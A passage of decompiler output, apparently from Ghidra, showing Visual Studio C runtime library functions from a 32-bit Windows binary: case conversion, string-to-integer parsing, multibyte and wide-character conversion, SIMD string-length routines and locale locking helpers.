          (int param_1,ulong param_2,__crt_locale_pointers *param_3)

{
  byte bVar1;
  bool bVar2;
  int iVar3;
  int *piVar4;
  int local_20;
  localeinfo_struct local_1c;
  char local_14;
  uint local_10;
  undefined2 local_c;
  undefined local_a;
  ushort local_8;
  undefined local_6;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_20,param_3);
  if ((uint)param_1 < 0x100) {
    bVar2 = internal_isupper_l(param_1,(__crt_locale_pointers *)&local_1c);
    if (bVar2) {
      bVar1 = (local_1c.locinfo)->pclmap[param_1];
      if (local_14 == '\0') {
        return (uint)bVar1;
      }
      *(uint *)(local_20 + 0x350) = *(uint *)(local_20 + 0x350) & 0xfffffffd;
      return (uint)bVar1;
    }
    if (local_14 == '\0') {
      return param_1;
    }
    *(uint *)(local_20 + 0x350) = *(uint *)(local_20 + 0x350) & 0xfffffffd;
    return param_1;
  }
  local_8 = 0;
  local_6 = 0;
  if (1 < (int)(local_1c.locinfo)->lc_codepage) {
    local_10 = param_1 >> 8;
    iVar3 = __isleadbyte_l(local_10 & 0xff,&local_1c);
    if (iVar3 != 0) {
      local_8 = CONCAT11((byte)param_1,(char)local_10);
      local_6 = 0;
      iVar3 = 2;
      goto LAB_00409875;
    }
  }
  piVar4 = __errno();
  *piVar4 = 0x2a;
  iVar3 = 1;
  local_8 = (ushort)(byte)param_1;
LAB_00409875:
  local_c = 0;
  local_a = 0;
  iVar3 = ___acrt_LCMapStringA
                    ((__crt_locale_pointers *)&local_1c,
                     (wchar_t *)(local_1c.locinfo)->locale_name[2],param_2,(char *)&local_8,iVar3,
                     (char *)&local_c,3,(local_1c.locinfo)->lc_collate_cp,1);
  if (iVar3 == 0) {
    if (local_14 != '\0') {
      *(uint *)(local_20 + 0x350) = *(uint *)(local_20 + 0x350) & 0xfffffffd;
    }
  }
  else if (iVar3 == 1) {
    param_1 = (int)(byte)local_c;
    if (local_14 != '\0') {
      *(uint *)(local_20 + 0x350) = *(uint *)(local_20 + 0x350) & 0xfffffffd;
    }
  }
  else {
    param_1 = (int)CONCAT11((byte)local_c,local_c._1_1_);
    if (local_14 != '\0') {
      *(uint *)(local_20 + 0x350) = *(uint *)(local_20 + 0x350) & 0xfffffffd;
    }
  }
  return param_1;
}



// Library Function - Single Match
//  bool __cdecl internal_isupper_l(int,struct __crt_locale_pointers * const)
// 
// Library: Visual Studio 2015 Release

bool __cdecl internal_isupper_l(int param_1,__crt_locale_pointers *param_2)

{
  int iVar1;
  
  iVar1 = __ischartype_l(param_1,1,(_locale_t)param_2);
  return iVar1 != 0;
}



// Library Function - Single Match
//  __tolower_l
// 
// Library: Visual Studio 2015 Release

int __cdecl __tolower_l(int _C,_locale_t _Locale)

{
  int iVar1;
  
  iVar1 = common_tox_l__bool___cdecl_internal_isupper_l_int_struct___crt_locale_pointers__const___int___cdecl_internal_map_lower_int_struct___crt_locale_pointers__const__
                    (_C,0x100,(__crt_locale_pointers *)_Locale);
  return iVar1;
}



// Library Function - Single Match
//  _tolower
// 
// Library: Visual Studio 2015 Release

int __cdecl _tolower(int _C)

{
  if (DAT_0041bd84 == 0) {
    if (_C - 0x41U < 0x1a) {
      _C = _C + 0x20;
    }
  }
  else {
    _C = __tolower_l(_C,(_locale_t)0x0);
  }
  return _C;
}



// Library Function - Multiple Matches With Same Base Name
//  class __crt_strtox::c_string_character_source<char> __cdecl
// __crt_strtox::make_c_string_character_source<char,char * *>(char const * const,char * * const)
//  class __crt_strtox::c_string_character_source<wchar_t> __cdecl
// __crt_strtox::make_c_string_character_source<wchar_t,wchar_t * *>(wchar_t const * const,wchar_t *
// * const)
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release

void __cdecl
make_c_string_character_source__(undefined4 *param_1,undefined4 param_2,undefined4 *param_3)

{
  *param_1 = param_2;
  param_1[1] = param_3;
  if (param_3 != (undefined4 *)0x0) {
    *param_3 = param_2;
  }
  return;
}



// Library Function - Single Match
//  _strtol
// 
// Library: Visual Studio 2015 Release

long __cdecl _strtol(char *_Str,char **_EndPtr,int _Radix)

{
  ulong uVar1;
  c_string_character_source_char_ extraout_var;
  int extraout_var_00;
  
  make_c_string_character_source__((undefined4 *)&stack0xffffffe8,_Str,_EndPtr);
  uVar1 = __crt_strtox::
          parse_integer_unsigned_long_class___crt_strtox__c_string_character_source_char___
                    ((__crt_locale_pointers *)0x0,extraout_var,extraout_var_00,
                     (bool)(undefined)_Radix);
  return uVar1;
}



// Library Function - Single Match
//  _wcstol
// 
// Library: Visual Studio 2015 Release

long __cdecl _wcstol(wchar_t *_Str,wchar_t **_EndPtr,int _Radix)

{
  ulong uVar1;
  c_string_character_source_wchar_t_ extraout_var;
  int extraout_var_00;
  
  make_c_string_character_source__((undefined4 *)&stack0xffffffe8,_Str,_EndPtr);
  uVar1 = __crt_strtox::
          parse_integer_unsigned_long_class___crt_strtox__c_string_character_source_wchar_t___
                    ((__crt_locale_pointers *)0x0,extraout_var,extraout_var_00,
                     (bool)(undefined)_Radix);
  return uVar1;
}



// Library Function - Single Match
//  __mbtowc_l
// 
// Library: Visual Studio 2015 Release

int __cdecl __mbtowc_l(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes,_locale_t _Locale)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  int local_14;
  localeinfo_struct local_10;
  char local_8;
  
  if ((_SrcCh == (char *)0x0) || (_SrcSizeInBytes == 0)) {
    return 0;
  }
  if (*_SrcCh == '\0') {
    if (_DstCh == (wchar_t *)0x0) {
      return 0;
    }
    *_DstCh = L'\0';
    return 0;
  }
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,(__crt_locale_pointers *)_Locale);
  if ((local_10.locinfo)->locale_name[2] == (wchar_t *)0x0) {
    if (_DstCh != (wchar_t *)0x0) {
      *_DstCh = (ushort)(byte)*_SrcCh;
    }
    uVar3 = 1;
    goto LAB_00409abb;
  }
  iVar1 = __isleadbyte_l((uint)(byte)*_SrcCh,&local_10);
  if (iVar1 == 0) {
    uVar3 = 1;
    iVar1 = MultiByteToWideChar((local_10.locinfo)->lc_collate_cp,9,_SrcCh,1,_DstCh,
                                (uint)(_DstCh != (wchar_t *)0x0));
    if (iVar1 != 0) goto LAB_00409abb;
LAB_00409aad:
    piVar2 = __errno();
    uVar3 = 0xffffffff;
    *piVar2 = 0x2a;
  }
  else {
    if ((int)(local_10.locinfo)->lc_codepage < 2) {
LAB_00409a7a:
      uVar3 = (local_10.locinfo)->lc_codepage;
LAB_00409a7d:
      if ((_SrcSizeInBytes < uVar3) || (_SrcCh[1] == '\0')) goto LAB_00409aad;
    }
    else {
      uVar3 = (local_10.locinfo)->lc_codepage;
      if ((int)_SrcSizeInBytes < (int)(local_10.locinfo)->lc_codepage) goto LAB_00409a7d;
      iVar1 = MultiByteToWideChar((local_10.locinfo)->lc_collate_cp,9,_SrcCh,
                                  (local_10.locinfo)->lc_codepage,_DstCh,
                                  (uint)(_DstCh != (wchar_t *)0x0));
      if (iVar1 == 0) goto LAB_00409a7a;
    }
    uVar3 = (local_10.locinfo)->lc_codepage;
  }
LAB_00409abb:
  if (local_8 != '\0') {
    *(uint *)(local_14 + 0x350) = *(uint *)(local_14 + 0x350) & 0xfffffffd;
    return uVar3;
  }
  return uVar3;
}



// Library Function - Single Match
//  _mbtowc
// 
// Library: Visual Studio 2015 Release

int __cdecl _mbtowc(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes)

{
  int iVar1;
  
  iVar1 = __mbtowc_l(_DstCh,_SrcCh,_SrcSizeInBytes,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __wctomb_s_l
// 
// Library: Visual Studio 2015 Release

errno_t __cdecl
__wctomb_s_l(int *_SizeConverted,char *_MbCh,size_t _SizeInBytes,wchar_t _WCh,_locale_t _Locale)

{
  int *piVar1;
  int iVar2;
  DWORD DVar3;
  errno_t eVar4;
  int local_18;
  int local_14;
  char local_c;
  int local_8;
  
  if ((_MbCh == (char *)0x0) && (_SizeInBytes != 0)) {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = 0;
    }
    return 0;
  }
  if (_SizeConverted != (int *)0x0) {
    *_SizeConverted = -1;
  }
  if (0x7fffffff < _SizeInBytes) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004091be();
    return 0x16;
  }
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_18,(__crt_locale_pointers *)_Locale);
  eVar4 = 0;
  if (*(int *)(local_14 + 0xa8) == 0) {
    if ((ushort)_WCh < 0x100) {
      if (_MbCh != (char *)0x0) {
        if (_SizeInBytes == 0) goto LAB_00409bfa;
        *_MbCh = (char)_WCh;
      }
      if (_SizeConverted != (int *)0x0) {
        *_SizeConverted = 1;
      }
      goto LAB_00409b7a;
    }
    if ((_MbCh != (char *)0x0) && (_SizeInBytes != 0)) {
      _memset(_MbCh,0,_SizeInBytes);
    }
  }
  else {
    local_8 = 0;
    iVar2 = WideCharToMultiByte(*(UINT *)(local_14 + 8),0,&_WCh,1,_MbCh,_SizeInBytes,(LPCSTR)0x0,
                                &local_8);
    if (iVar2 == 0) {
      DVar3 = GetLastError();
      if (DVar3 == 0x7a) {
        if ((_MbCh != (char *)0x0) && (_SizeInBytes != 0)) {
          _memset(_MbCh,0,_SizeInBytes);
        }
LAB_00409bfa:
        piVar1 = __errno();
        eVar4 = 0x22;
        *piVar1 = 0x22;
        FUN_004091be();
        goto LAB_00409b7a;
      }
    }
    else if (local_8 == 0) {
      if (_SizeConverted != (int *)0x0) {
        *_SizeConverted = iVar2;
      }
      goto LAB_00409b7a;
    }
  }
  piVar1 = __errno();
  eVar4 = 0x2a;
  *piVar1 = 0x2a;
LAB_00409b7a:
  if (local_c != '\0') {
    *(uint *)(local_18 + 0x350) = *(uint *)(local_18 + 0x350) & 0xfffffffd;
  }
  return eVar4;
}



// Library Function - Single Match
//  _wctomb_s
// 
// Library: Visual Studio 2015 Release

errno_t __cdecl _wctomb_s(int *_SizeConverted,char *_MbCh,rsize_t _SizeInBytes,wchar_t _WCh)

{
  errno_t eVar1;
  
  eVar1 = __wctomb_s_l(_SizeConverted,_MbCh,_SizeInBytes,_WCh,(_locale_t)0x0);
  return eVar1;
}



// Library Function - Single Match
//  _strnlen
// 
// Library: Visual Studio 2015 Release

size_t __cdecl _strnlen(char *_Str,size_t _MaxCount)

{
  char *pcVar1;
  size_t sVar2;
  undefined (*pauVar3) [32];
  uint uVar4;
  undefined (*pauVar5) [32];
  char *pcVar6;
  undefined auVar7 [16];
  undefined auVar8 [32];
  undefined in_YMM1 [32];
  undefined auVar10 [32];
  byte bVar9;
  
  if (DAT_0041bb84 < 5) {
    if (DAT_0041bb84 < 1) {
      pcVar1 = _Str;
      if (_Str != _Str + _MaxCount) {
        do {
          if (*pcVar1 == '\0') break;
          pcVar1 = pcVar1 + 1;
        } while (pcVar1 != _Str + _MaxCount);
      }
      sVar2 = (int)pcVar1 - (int)_Str;
    }
    else {
      uVar4 = -(uint)(((uint)_Str & 0xf) != 0) & 0x10 - ((uint)_Str & 0xf);
      if (_MaxCount < uVar4) {
        uVar4 = _MaxCount;
      }
      pcVar1 = _Str;
      if (_Str != _Str + uVar4) {
        do {
          if (*pcVar1 == '\0') break;
          pcVar1 = pcVar1 + 1;
        } while (pcVar1 != _Str + uVar4);
      }
      sVar2 = (int)pcVar1 - (int)_Str;
      if (sVar2 == uVar4) {
        pcVar1 = _Str + sVar2;
        auVar10 = in_YMM1 & (undefined  [32])0xffffffffffffffff;
        pcVar6 = pcVar1 + ((_MaxCount - uVar4) - (_MaxCount - uVar4 & 0xf));
        for (; pcVar1 != pcVar6; pcVar1 = pcVar1 + 0x10) {
          bVar9 = -(pcVar1[0xf] == SUB321(auVar10 >> 0x78,0));
          auVar7 = CONCAT115(bVar9,CONCAT114(-(pcVar1[0xe] == SUB321(auVar10 >> 0x70,0)),
                                             CONCAT113(-(pcVar1[0xd] == SUB321(auVar10 >> 0x68,0)),
                                                       CONCAT112(-(pcVar1[0xc] ==
                                                                  SUB321(auVar10 >> 0x60,0)),
                                                                 CONCAT111(-(pcVar1[0xb] ==
                                                                            SUB321(auVar10 >> 0x58,0
                                                                                  )),
                                                                           CONCAT110(-(pcVar1[10] ==
                                                                                      SUB321(auVar10
                                                                                             >> 0x50
                                                  ,0)),CONCAT19(-(pcVar1[9] ==
                                                                 SUB321(auVar10 >> 0x48,0)),
                                                                CONCAT18(-(pcVar1[8] ==
                                                                          SUB321(auVar10 >> 0x40,0))
                                                                         ,CONCAT17(-(pcVar1[7] ==
                                                                                    SUB321(auVar10 
                                                  >> 0x38,0)),
                                                  CONCAT16(-(pcVar1[6] == SUB321(auVar10 >> 0x30,0))
                                                           ,CONCAT15(-(pcVar1[5] ==
                                                                      SUB321(auVar10 >> 0x28,0)),
                                                                     CONCAT14(-(pcVar1[4] ==
                                                                               SUB321(auVar10 >>
                                                                                      0x20,0)),
                                                                              CONCAT13(-(pcVar1[3]
                                                                                        == SUB321(
                                                  auVar10 >> 0x18,0)),
                                                  CONCAT12(-(pcVar1[2] == SUB321(auVar10 >> 0x10,0))
                                                           ,CONCAT11(-(pcVar1[1] ==
                                                                      SUB321(auVar10 >> 8,0)),
                                                                     -(*pcVar1 == SUB321(auVar10,0))
                                                                    )))))))))))))));
          if ((ushort)((ushort)(SUB161(auVar7 >> 7,0) & 1) |
                       (ushort)(SUB161(auVar7 >> 0xf,0) & 1) << 1 |
                       (ushort)(SUB161(auVar7 >> 0x17,0) & 1) << 2 |
                       (ushort)(SUB161(auVar7 >> 0x1f,0) & 1) << 3 |
                       (ushort)(SUB161(auVar7 >> 0x27,0) & 1) << 4 |
                       (ushort)(SUB161(auVar7 >> 0x2f,0) & 1) << 5 |
                       (ushort)(SUB161(auVar7 >> 0x37,0) & 1) << 6 |
                       (ushort)(SUB161(auVar7 >> 0x3f,0) & 1) << 7 |
                       (ushort)(SUB161(auVar7 >> 0x47,0) & 1) << 8 |
                       (ushort)(SUB161(auVar7 >> 0x4f,0) & 1) << 9 |
                       (ushort)(SUB161(auVar7 >> 0x57,0) & 1) << 10 |
                       (ushort)(SUB161(auVar7 >> 0x5f,0) & 1) << 0xb |
                       (ushort)(SUB161(auVar7 >> 0x67,0) & 1) << 0xc |
                       (ushort)(SUB161(auVar7 >> 0x6f,0) & 1) << 0xd |
                       (ushort)(SUB161(auVar7 >> 0x77,0) & 1) << 0xe | (ushort)(bVar9 >> 7) << 0xf)
              != 0) break;
        }
        for (; (pcVar1 != _Str + _MaxCount && (*pcVar1 != '\0')); pcVar1 = pcVar1 + 1) {
        }
        sVar2 = (int)pcVar1 - (int)_Str;
      }
    }
  }
  else {
    uVar4 = -(uint)(((uint)_Str & 0x1f) != 0) & 0x20 - ((uint)_Str & 0x1f);
    if (_MaxCount < uVar4) {
      uVar4 = _MaxCount;
    }
    pcVar1 = _Str;
    if (_Str != _Str + uVar4) {
      do {
        if (*pcVar1 == '\0') break;
        pcVar1 = pcVar1 + 1;
      } while (pcVar1 != _Str + uVar4);
    }
    sVar2 = (int)pcVar1 - (int)_Str;
    if (sVar2 == uVar4) {
      pauVar3 = (undefined (*) [32])(_Str + sVar2);
      auVar10 = vxorps_avx(in_YMM1,in_YMM1);
      pauVar5 = (undefined (*) [32])
                (((_MaxCount - uVar4) - (_MaxCount - uVar4 & 0x1f)) + (int)pauVar3);
      while ((pauVar3 != pauVar5 &&
             (auVar8 = vpcmpeqb_avx2(auVar10,*pauVar3),
             ((uint)(SUB321(auVar8 >> 7,0) & 1) | (uint)(SUB321(auVar8 >> 0xf,0) & 1) << 1 |
              (uint)(SUB321(auVar8 >> 0x17,0) & 1) << 2 | (uint)(SUB321(auVar8 >> 0x1f,0) & 1) << 3
              | (uint)(SUB321(auVar8 >> 0x27,0) & 1) << 4 |
              (uint)(SUB321(auVar8 >> 0x2f,0) & 1) << 5 | (uint)(SUB321(auVar8 >> 0x37,0) & 1) << 6
              | (uint)(SUB321(auVar8 >> 0x3f,0) & 1) << 7 |
              (uint)(SUB321(auVar8 >> 0x47,0) & 1) << 8 | (uint)(SUB321(auVar8 >> 0x4f,0) & 1) << 9
              | (uint)(SUB321(auVar8 >> 0x57,0) & 1) << 10 |
              (uint)(SUB321(auVar8 >> 0x5f,0) & 1) << 0xb |
              (uint)(SUB321(auVar8 >> 0x67,0) & 1) << 0xc |
              (uint)(SUB321(auVar8 >> 0x6f,0) & 1) << 0xd |
              (uint)(SUB321(auVar8 >> 0x77,0) & 1) << 0xe | (uint)SUB321(auVar8 >> 0x7f,0) << 0xf |
              (uint)(SUB321(auVar8 >> 0x87,0) & 1) << 0x10 |
              (uint)(SUB321(auVar8 >> 0x8f,0) & 1) << 0x11 |
              (uint)(SUB321(auVar8 >> 0x97,0) & 1) << 0x12 |
              (uint)(SUB321(auVar8 >> 0x9f,0) & 1) << 0x13 |
              (uint)(SUB321(auVar8 >> 0xa7,0) & 1) << 0x14 |
              (uint)(SUB321(auVar8 >> 0xaf,0) & 1) << 0x15 |
              (uint)(SUB321(auVar8 >> 0xb7,0) & 1) << 0x16 | (uint)SUB321(auVar8 >> 0xbf,0) << 0x17
              | (uint)(SUB321(auVar8 >> 199,0) & 1) << 0x18 |
              (uint)(SUB321(auVar8 >> 0xcf,0) & 1) << 0x19 |
              (uint)(SUB321(auVar8 >> 0xd7,0) & 1) << 0x1a |
              (uint)(SUB321(auVar8 >> 0xdf,0) & 1) << 0x1b |
              (uint)(SUB321(auVar8 >> 0xe7,0) & 1) << 0x1c |
              (uint)(SUB321(auVar8 >> 0xef,0) & 1) << 0x1d |
              (uint)(SUB321(auVar8 >> 0xf7,0) & 1) << 0x1e | (uint)SUB321(auVar8 >> 0xff,0) << 0x1f)
             == 0))) {
        pauVar3 = pauVar3[1];
      }
      for (; (pauVar3 != (undefined (*) [32])(_Str + _MaxCount) && ((*pauVar3)[0] != '\0'));
          pauVar3 = (undefined (*) [32])(*pauVar3 + 1)) {
      }
      sVar2 = (int)pauVar3 - (int)_Str;
      vzeroupper_avx();
    }
  }
  return sVar2;
}



// Library Function - Single Match
//  _wcsnlen
// 
// Library: Visual Studio 2015 Release

size_t __cdecl _wcsnlen(wchar_t *_Src,size_t _MaxCount)

{
  undefined (*pauVar1) [32];
  wchar_t *pwVar2;
  size_t sVar3;
  undefined (*pauVar4) [32];
  wchar_t *pwVar5;
  int iVar6;
  uint uVar7;
  undefined auVar8 [16];
  undefined auVar9 [32];
  undefined in_YMM1 [32];
  undefined auVar11 [32];
  ushort uVar10;
  
  pwVar5 = _Src;
  if (DAT_0041bb84 < 5) {
    if (DAT_0041bb84 < 1) {
      if (_Src != _Src + _MaxCount) {
        do {
          if (*pwVar5 == L'\0') break;
          pwVar5 = pwVar5 + 1;
        } while (pwVar5 != _Src + _MaxCount);
      }
    }
    else {
      if (((uint)_Src & 1) == 0) {
        uVar7 = (-(uint)(((uint)_Src & 0xf) != 0) & 0x10 - ((uint)_Src & 0xf)) >> 1;
        if (_MaxCount < uVar7) {
          uVar7 = _MaxCount;
        }
        if (_Src != _Src + uVar7) {
          do {
            if (*pwVar5 == L'\0') break;
            pwVar5 = pwVar5 + 1;
          } while (pwVar5 != _Src + uVar7);
        }
        sVar3 = (int)pwVar5 - (int)_Src >> 1;
        if (sVar3 != uVar7) {
          return sVar3;
        }
        pwVar5 = _Src + sVar3;
        auVar11 = in_YMM1 & (undefined  [32])0xffffffffffffffff;
        pwVar2 = pwVar5 + ((_MaxCount - uVar7) - (_MaxCount - uVar7 & 0xf));
        for (; pwVar5 != pwVar2; pwVar5 = pwVar5 + 8) {
          uVar10 = -(ushort)(pwVar5[7] == SUB322(auVar11 >> 0x70,0));
          auVar8 = CONCAT214(uVar10,CONCAT212(-(ushort)(pwVar5[6] == SUB322(auVar11 >> 0x60,0)),
                                              CONCAT210(-(ushort)(pwVar5[5] ==
                                                                 SUB322(auVar11 >> 0x50,0)),
                                                        CONCAT28(-(ushort)(pwVar5[4] ==
                                                                          SUB322(auVar11 >> 0x40,0))
                                                                 ,CONCAT26(-(ushort)(pwVar5[3] ==
                                                                                    SUB322(auVar11 
                                                  >> 0x30,0)),
                                                  CONCAT24(-(ushort)(pwVar5[2] ==
                                                                    SUB322(auVar11 >> 0x20,0)),
                                                           CONCAT22(-(ushort)(pwVar5[1] ==
                                                                             SUB322(auVar11 >> 0x10,
                                                                                    0)),
                                                                    -(ushort)(*pwVar5 ==
                                                                             SUB322(auVar11,0)))))))
                                             ));
          if ((ushort)((ushort)(SUB161(auVar8 >> 7,0) & 1) |
                       (ushort)(SUB161(auVar8 >> 0xf,0) & 1) << 1 |
                       (ushort)(SUB161(auVar8 >> 0x17,0) & 1) << 2 |
                       (ushort)(SUB161(auVar8 >> 0x1f,0) & 1) << 3 |
                       (ushort)(SUB161(auVar8 >> 0x27,0) & 1) << 4 |
                       (ushort)(SUB161(auVar8 >> 0x2f,0) & 1) << 5 |
                       (ushort)(SUB161(auVar8 >> 0x37,0) & 1) << 6 |
                       (ushort)(SUB161(auVar8 >> 0x3f,0) & 1) << 7 |
                       (ushort)(SUB161(auVar8 >> 0x47,0) & 1) << 8 |
                       (ushort)(SUB161(auVar8 >> 0x4f,0) & 1) << 9 |
                       (ushort)(SUB161(auVar8 >> 0x57,0) & 1) << 10 |
                       (ushort)(SUB161(auVar8 >> 0x5f,0) & 1) << 0xb |
                       (ushort)(SUB161(auVar8 >> 0x67,0) & 1) << 0xc |
                       (ushort)(SUB161(auVar8 >> 0x6f,0) & 1) << 0xd |
                       (ushort)((byte)(uVar10 >> 7) & 1) << 0xe | uVar10 & 0x8000) != 0) break;
        }
        for (; (pwVar5 != _Src + _MaxCount && (*pwVar5 != L'\0')); pwVar5 = pwVar5 + 1) {
        }
        iVar6 = (int)pwVar5 - (int)_Src;
        goto LAB_00409eff;
      }
      if (_Src != _Src + _MaxCount) {
        do {
          if (*pwVar5 == L'\0') break;
          pwVar5 = pwVar5 + 1;
        } while (pwVar5 != _Src + _MaxCount);
      }
    }
  }
  else {
    if (((uint)_Src & 1) == 0) {
      uVar7 = (-(uint)(((uint)_Src & 0x1f) != 0) & 0x20 - ((uint)_Src & 0x1f)) >> 1;
      if (_MaxCount < uVar7) {
        uVar7 = _MaxCount;
      }
      if (_Src != _Src + uVar7) {
        do {
          if (*pwVar5 == L'\0') break;
          pwVar5 = pwVar5 + 1;
        } while (pwVar5 != _Src + uVar7);
      }
      sVar3 = (int)pwVar5 - (int)_Src >> 1;
      if (sVar3 != uVar7) {
        return sVar3;
      }
      pauVar4 = (undefined (*) [32])(_Src + sVar3);
      auVar11 = vxorps_avx(in_YMM1,in_YMM1);
      pauVar1 = (undefined (*) [32])
                ((int)pauVar4 + ((_MaxCount - uVar7) - (_MaxCount - uVar7 & 0x1f)) * 2);
      while ((pauVar4 != pauVar1 &&
             (auVar9 = vpcmpeqw_avx2(auVar11,*pauVar4),
             ((uint)(SUB321(auVar9 >> 7,0) & 1) | (uint)(SUB321(auVar9 >> 0xf,0) & 1) << 1 |
              (uint)(SUB321(auVar9 >> 0x17,0) & 1) << 2 | (uint)(SUB321(auVar9 >> 0x1f,0) & 1) << 3
              | (uint)(SUB321(auVar9 >> 0x27,0) & 1) << 4 |
              (uint)(SUB321(auVar9 >> 0x2f,0) & 1) << 5 | (uint)(SUB321(auVar9 >> 0x37,0) & 1) << 6
              | (uint)(SUB321(auVar9 >> 0x3f,0) & 1) << 7 |
              (uint)(SUB321(auVar9 >> 0x47,0) & 1) << 8 | (uint)(SUB321(auVar9 >> 0x4f,0) & 1) << 9
              | (uint)(SUB321(auVar9 >> 0x57,0) & 1) << 10 |
              (uint)(SUB321(auVar9 >> 0x5f,0) & 1) << 0xb |
              (uint)(SUB321(auVar9 >> 0x67,0) & 1) << 0xc |
              (uint)(SUB321(auVar9 >> 0x6f,0) & 1) << 0xd |
              (uint)(SUB321(auVar9 >> 0x77,0) & 1) << 0xe | (uint)SUB321(auVar9 >> 0x7f,0) << 0xf |
              (uint)(SUB321(auVar9 >> 0x87,0) & 1) << 0x10 |
              (uint)(SUB321(auVar9 >> 0x8f,0) & 1) << 0x11 |
              (uint)(SUB321(auVar9 >> 0x97,0) & 1) << 0x12 |
              (uint)(SUB321(auVar9 >> 0x9f,0) & 1) << 0x13 |
              (uint)(SUB321(auVar9 >> 0xa7,0) & 1) << 0x14 |
              (uint)(SUB321(auVar9 >> 0xaf,0) & 1) << 0x15 |
              (uint)(SUB321(auVar9 >> 0xb7,0) & 1) << 0x16 | (uint)SUB321(auVar9 >> 0xbf,0) << 0x17
              | (uint)(SUB321(auVar9 >> 199,0) & 1) << 0x18 |
              (uint)(SUB321(auVar9 >> 0xcf,0) & 1) << 0x19 |
              (uint)(SUB321(auVar9 >> 0xd7,0) & 1) << 0x1a |
              (uint)(SUB321(auVar9 >> 0xdf,0) & 1) << 0x1b |
              (uint)(SUB321(auVar9 >> 0xe7,0) & 1) << 0x1c |
              (uint)(SUB321(auVar9 >> 0xef,0) & 1) << 0x1d |
              (uint)(SUB321(auVar9 >> 0xf7,0) & 1) << 0x1e | (uint)SUB321(auVar9 >> 0xff,0) << 0x1f)
             == 0))) {
        pauVar4 = pauVar4[1];
      }
      for (; (pauVar4 != (undefined (*) [32])(_Src + _MaxCount) && (*(short *)*pauVar4 != 0));
          pauVar4 = (undefined (*) [32])(*pauVar4 + 2)) {
      }
      vzeroupper_avx();
      return (int)pauVar4 - (int)_Src >> 1;
    }
    if (_Src != _Src + _MaxCount) {
      do {
        if (*pwVar5 == L'\0') break;
        pwVar5 = pwVar5 + 1;
      } while (pwVar5 != _Src + _MaxCount);
    }
  }
  iVar6 = (int)pwVar5 - (int)_Src;
LAB_00409eff:
  return iVar6 >> 1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Multiple Matches With Same Base Name
//  public: void __thiscall __crt_seh_guarded_call<void>::operator()<class
// <lambda_3518db117f0e7cdb002338c5d3c47b6c>,class <lambda_b2ea41f6bbb362cd97d94c6828d90b61>&,class
// <lambda_abdedf541bb04549bc734292b4a045d4>>(class
// <lambda_3518db117f0e7cdb002338c5d3c47b6c>&&,class
// <lambda_b2ea41f6bbb362cd97d94c6828d90b61>&,class <lambda_abdedf541bb04549bc734292b4a045d4>&&)
//  public: void __thiscall __crt_seh_guarded_call<void>::operator()<class
// <lambda_a7e850c220f1c8d1e6efeecdedd162c6>,class <lambda_46720907175c18b6c9d2717bc0d2d362>&,class
// <lambda_9048902d66e8d99359bc9897bbb930a8>>(class
// <lambda_a7e850c220f1c8d1e6efeecdedd162c6>&&,class
// <lambda_46720907175c18b6c9d2717bc0d2d362>&,class <lambda_9048902d66e8d99359bc9897bbb930a8>&&)
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release

void operator____(int *param_1,undefined4 *param_2)

{
  ___acrt_lock(*param_1);
  replace_current_thread_locale_nolock(*(__acrt_ptd **)*param_2,**(__crt_locale_data ***)param_2[1])
  ;
  FUN_00409f4d();
  return;
}



void FUN_00409f4d(void)

{
  int unaff_EBP;
  
  ___acrt_unlock(**(int **)(unaff_EBP + 0x10));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Multiple Matches With Same Base Name
//  public: void __thiscall __crt_seh_guarded_call<void>::operator()<class
// <lambda_38edbb1296d33220d7e4dd0ed76b244a>,class <lambda_5ce1d447e08cb34b2473517608e21441>&,class
// <lambda_fb385d3da700c9147fc39e65dd577a8c>>(class
// <lambda_38edbb1296d33220d7e4dd0ed76b244a>&&,class
// <lambda_5ce1d447e08cb34b2473517608e21441>&,class <lambda_fb385d3da700c9147fc39e65dd577a8c>&&)
//  public: void __thiscall __crt_seh_guarded_call<void>::operator()<class
// <lambda_51b6e8b1eb166f2a3faf91f424b38130>,class <lambda_6250bd4b2a391816dd638c3bf72b0bcb>&,class
// <lambda_0b5a4a3e68152e1d9b943535f5f47bed>>(class
// <lambda_51b6e8b1eb166f2a3faf91f424b38130>&&,class
// <lambda_6250bd4b2a391816dd638c3bf72b0bcb>&,class <lambda_0b5a4a3e68152e1d9b943535f5f47bed>&&)
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release

void operator____(int *param_1,int **param_2)

{
  int *_Memory;
  int iVar1;
  
  ___acrt_lock(*param_1);
  _Memory = *(int **)(**param_2 + 0x48);
  if (_Memory != (int *)0x0) {
    LOCK();
    iVar1 = *_Memory;
    *_Memory = iVar1 + -1;
    if ((iVar1 + -1 == 0) && (_Memory != &DAT_0041b4f0)) {
      FID_conflict__free(_Memory);
    }
  }
  FUN_00409fae();
  return;
}



void FUN_00409fae(void)

{
  int unaff_EBP;
  
  ___acrt_unlock(**(int **)(unaff_EBP + 0x10));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Multiple Matches With Same Base Name
//  public: void __thiscall __crt_seh_guarded_call<void>::operator()<class
// <lambda_5b71d36f03204c0beab531769a5b5694>,class <lambda_be2b3da3f62db62e9dad5dc70221a656>&,class
// <lambda_8f9ce462984622f9bf76b59e2aaaf805>>(class
// <lambda_5b71d36f03204c0beab531769a5b5694>&&,class
// <lambda_be2b3da3f62db62e9dad5dc70221a656>&,class <lambda_8f9ce462984622f9bf76b59e2aaaf805>&&)
//  public: void __thiscall __crt_seh_guarded_call<void>::operator()<class
